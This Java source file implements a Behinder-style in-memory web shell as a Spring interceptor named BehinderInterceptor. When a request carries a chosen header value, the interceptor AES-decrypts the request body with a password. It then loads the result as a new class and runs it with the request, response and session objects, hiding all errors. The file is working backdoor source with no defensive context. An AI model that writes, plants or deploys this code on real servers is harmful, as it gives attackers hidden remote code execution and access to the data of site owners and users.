package jmg.behinder.memshell;

import org.springframework.web.servlet.AsyncHandlerInterceptor;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInterceptor {


    public String pass;

    public String headerName;

    public String headerValue;


    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }


    public BehinderInterceptor(ClassLoader c) {
        super(c);
    }


    public BehinderInterceptor() {
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
            try {
                HttpSession session = request.getSession();
                Map obj = new HashMap();
                obj.put("request", request);
                obj.put("response", response);
                obj.put("session", session);
                session.putValue("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                (new BehinderInterceptor(this.getClass().getClassLoader())).g(c.doFinal(this.b64Decode(request.getReader().readLine()))).newInstance().equals(obj);
            } catch (Exception e) {
            }
            return false;
        } else {
            return true;
        }
    }

    public static byte[] b64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
}

